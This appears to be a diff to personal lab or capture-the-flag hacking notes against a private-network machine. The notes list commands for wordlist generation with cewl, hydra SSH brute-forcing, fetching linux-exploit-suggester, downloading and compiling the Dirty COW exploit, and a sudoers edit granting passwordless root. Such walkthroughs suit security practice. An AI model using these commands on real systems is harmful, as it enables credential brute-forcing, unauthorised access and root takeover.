@@ -64,4 +64,18 @@
     Sometimes checking /opt /tmp /var /usr might help.
     Edit sudoers file and grant sudo access to the current user (www-data in this case) with no password
     echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers
+    ================================================================
+    to generate wordlist
+cewl http://192.168.1.7:1898/?q=node/1 -w /root/boxs/list.txt
+============================
+hydra -l tiago -P /root/boxs/list.txt ssh://192.168.1.7
+====================================================
+ssh tiago@192.168.1.7
+=================================
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+============================================================
+dirtycow 2
+https://www.exploit-db.com/download/40847.cpp
+compileing
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 
